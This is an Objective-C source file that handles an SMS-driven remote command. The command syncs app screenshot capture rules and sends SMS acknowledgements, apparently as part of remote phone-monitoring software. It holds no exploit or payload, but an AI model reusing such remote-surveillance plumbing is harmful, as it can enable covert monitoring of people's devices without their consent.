//
//  SyncAppScreenShotProcessor.m
//  RCM
//
//  Created by ophat on 4/4/16.
//
//

#import "SyncAppScreenShotProcessor.h"

@interface SyncAppScreenShotProcessor (PrivateAPI)
- (void) processSyncAppScreenShotRule;
- (void) acknowldgeMessage;
- (void) syncAppScreenShotProcessorException;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete;
- (void) processFinished;
@end

@implementation SyncAppScreenShotProcessor

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    DLog (@"SyncAppScreenShotProcessor --->initWithRemoteCommandData");
    if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
    }
    return self;
}

#pragma mark RemoteCmdProcessor Methods

- (void) doProcessingCommand {
    DLog (@"SyncAppScreenShotProcessor--->doProcessingCommand");
    
    if (![RemoteCmdSignatureUtils verifyRemoteCmdDataSignature:mRemoteCmdData numberOfMinimumCompulsoryTag:2]) {
        [RemoteCmdSignatureUtils throwInvalidCmdWithName:@"SyncAppScreenShotProcessor" reason:@"Failed signature check"];
    }
    
    [self processSyncAppScreenShotRule];
}

#pragma mark RequestSyncAppScreenShotRuleProcessor Private Mehods

- (void) processSyncAppScreenShotRule {
    DLog (@"SyncAppScreenShotProcessor--->processSyncAppScreenShotRule");
    
    id <AppScreenShotManager> appScreenShot = [[RemoteCmdUtils sharedRemoteCmdUtils] mAppScreenShotManager];
    BOOL isReady = [appScreenShot requestAppScreenShotRule:self];
    
    if (!isReady) {
        DLog (@"!!! not ready to process SyncAppScreenShotRuleProcessor command");
        [self syncSyncAppScreenShotRuleException];
    } else {
       	DLog (@".... processing SyncAppScreenShotRuleProcessor command");
        [self acknowldgeMessage];
    }
}

- (void) syncSyncAppScreenShotRuleException {
    DLog (@"SyncAppScreenShotRule ---> syncSyncAppScreenShotRuleException");
    FxException* exception = [FxException exceptionWithName:@"syncSyncAppScreenShotRuleException" andReason:@"SyncAppScreenShotRule error"];
    [exception setErrorCode:kAppScreenShotBusy];
    [exception setErrorCategory:kFxErrorRCM];
    @throw exception;
}


- (void) acknowldgeMessage {
    NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode] andErrorCode:_SUCCESS_];
    NSString *ackMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kSyncAppScreenShotRuleMSG1", @"")];
    [self sendReplySMS:ackMessage isProcessCompleted:NO];
}

- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
    DLog (@"SyncAppScreenShotProcessor--->sendReplySMS");
    [[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData andReplyMessage:aReplyMessage];
    if ([mRemoteCmdData mIsSMSReplyRequired]) {
        [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]  andMessage:aReplyMessage];
    }
    if (aIsComplete) {
        [self processFinished];
    }
    else {
        DLog (@"Sent acknowldge message.");
    }
}

-(void) processFinished {
    DLog (@"SyncAppScreenShotProcessor--->processFinished");
    if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
        [mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
    }
}

#pragma mark NetworkTrafficRuleDelegate methods

- (void) requestAppScreenShotRuleCompleted:(NSError *)aError {
    if (aError) {
        [self syncSyncAppScreenShotRuleException];
    }else{
        DLog(@"requestAppScreenShotRuleCompleted --->.");
        NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode] andErrorCode:_SUCCESS_];
        NSString *ackMessage = [messageFormat stringByAppendingString:NSLocalizedString(@"kSyncAppScreenShotRuleMSG2", @"")];
        [self sendReplySMS:ackMessage isProcessCompleted:YES];
    }
}

- (void) dealloc {
    [super dealloc];
}

@end
